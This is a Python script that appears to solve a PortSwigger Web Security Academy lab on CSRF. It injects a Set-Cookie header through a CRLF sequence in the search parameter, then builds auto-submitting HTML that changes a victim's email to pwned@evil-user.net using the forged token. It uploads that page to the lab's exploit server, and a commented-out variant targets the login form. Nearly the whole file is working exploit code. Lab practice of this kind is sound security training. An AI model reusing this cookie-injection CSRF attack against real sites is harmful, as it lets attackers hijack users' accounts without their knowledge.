import urllib

import requests
from bs4 import BeautifulSoup

site = 'ac9a1fe41e9805b8c0ad1c6e00c30054.web-security-academy.net'
s = requests.session()

if __name__ == "__main__":
    search_term = urllib.parse.quote("wuchang\nSet-Cookie: csrf=foo")
    search_url = f'https://{site}/?search={search_term}'
    print(f'URL to embed ({search_url})')

    # login_url = f"https://{site}/login"
    # exploit_html = f'''
    #     <form action="{login_url}" method="POST">
    #     <input type="hidden" name="username" value="wiener">
    #     <input type="hidden" name="password" value="peter">
    #     <input type="hidden" name="csrf" value="foo">
    #     </form>
    #     <img src="{search_url}" onerror="document.forms[0].submit();">
    # '''
    change_email_url = f'https://{site}/my-account/change-email'
    exploit_html = f'''
        <form action="{change_email_url}" method="POST">
        <input type="hidden" name="email" value="pwned@evil-user.net">
        <input type="hidden" name="csrf" value="foo">
        </form>
        <img src="{search_url}"
        onerror="document.forms[0].submit();">
    '''

    url = f'https://{site}/'
    resp = s.get(url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    exploit_url = soup.find('a', {'id': 'exploit-link'}).get('href')

    formData = {
        'urlIsHttps': 'on',
        'responseFile': '/exploit',
        'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
        'responseBody': exploit_html,
        'formAction': 'STORE'
    }
    resp = s.post(exploit_url, data=formData)
